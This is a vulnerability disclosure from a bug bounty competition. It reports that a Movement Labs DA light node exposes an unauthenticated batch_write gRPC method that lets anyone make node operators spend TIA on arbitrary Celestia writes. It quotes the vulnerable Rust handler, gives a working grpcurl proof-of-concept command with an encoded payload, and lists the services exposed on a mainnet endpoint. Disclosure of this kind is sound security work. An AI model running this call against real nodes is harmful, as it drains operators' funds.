# #43253 \[BC-Critical] Attackers can drain TIA from nodes in networks running in sequencer mode

**Submitted on Apr 4th 2025 at 02:57:21 UTC by @usmannk for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43253
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

The batch\_write rpc call can be abused by attackers to write arbitrary data to the Celestia network. Anyone running the DA Light Node is at risk.

## Vulnerability Details

The batch\_write RPC method does not have access control. Further, the LightNodeService is bound to the ip address 0.0.0.0 in both the default and suggested (<https://docs.movementnetwork.xyz/assets/files/config-4551e1260977506ebb8dcdea19b254ed.json>) configurations. Because 0.0.0.0 allows requests from not just the local host but any IP address on the internet, an attacker may call this RPC to write arbitrary data to the Celestia network. Each time this is done the node operator spends TIA tokens to persist this data

Even with all prevalidators enabled, an attacker can simply resubmit old signed blobs to be forwarded to Celestia.

## Impact Details

Node operators face direct loss of funds (TIA).

## References

`protocol-units/da/movement/protocol/light-node/src/sequencer.rs`

```
async fn batch_write(
		&self,
		request: tonic::Request<grpc::BatchWriteRequest>,
	) -> std::result::Result<tonic::Response<grpc::BatchWriteResponse>, tonic::Status> {
		info!("here 0_1");
		info!("{}", serde_json::to_string(&Transaction::test()).unwrap());
		let blobs_for_submission = request.into_inner().blobs;

		// make transactions from the blobs
		let mut transactions = Vec::new();
		for blob in blobs_for_submission {
			let transaction: Transaction = serde_json::from_slice(&blob.data)
				.map_err(|e| tonic::Status::internal(e.to_string()))?;
			info!("{}",self.prevalidator.is_some());
			match &self.prevalidator {
				Some(prevalidator) => {
					// match the prevalidated status, if validation error discard if internal error raise internal error
					match prevalidator.prevalidate(transaction).await {
						Ok(prevalidated) => {
							transactions.push(prevalidated.into_inner());
						}
						Err(e) => {
							match e {
								movement_da_light_node_prevalidator::Error::Validation(_) => {
									// discard the transaction
									info!(
										"discarding transaction due to prevalidation error {:?}",
										e
									);
								}
								movement_da_light_node_prevalidator::Error::Internal(e) => {
									return Err(tonic::Status::internal(e.to_string()));
								}
							}
						}
					}
				}
				None => transactions.push(transaction),
			}
		}

		// publish the transactions
		let memseq = self.memseq.clone();
		memseq
			.publish_many(transactions)
			.await
			.map_err(|e| tonic::Status::internal(e.to_string()))?;

		Ok(tonic::Response::new(grpc::BatchWriteResponse { blobs: vec![] }))
	}
```

## Proof of Concept

## Proof of Concept

* Run a node in sequencer mode
* Call this node's batch\_write RPC method from another host:
* `grpcurl -v -plaintext -d '{"blobs":[{"data":"eyJkYXRhIjpbMF0sImFwcGxpY2F0aW9uX3ByaW9yaXR5IjowLCJzZXF1ZW5jZV9udW1iZXIiOjAsImlkIjpbMTU3LDIxLDU1LDQzLDI0LDQ4LDExNSw5MCwxMCw0NSw1LDMzLDcwLDEwNSwyMjcsMzksMjYsMTE3LDc0LDE3Miw3MCwyNTQsNDgsNTksMTA0LDE4Nyw0OCw3MCwxLDU4LDUsMTEwXX0K"}]}' localhost:30730 movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService/BatchWrite` (this can be expanded to several megabytes of data at one time)
* The node unconditionally submits this to Celestia to be written, paying for the cost.

The live Movement mainnet exposes this service as seen here:

```
$ grpcurl m1-da-light-node.mainnet.movementnetwork.xyz:443 list movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.BatchRead
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.BatchWrite
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.ReadAtHeight
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.StreamReadFromHeight
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.StreamReadLatest
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.StreamWriteBlob
```
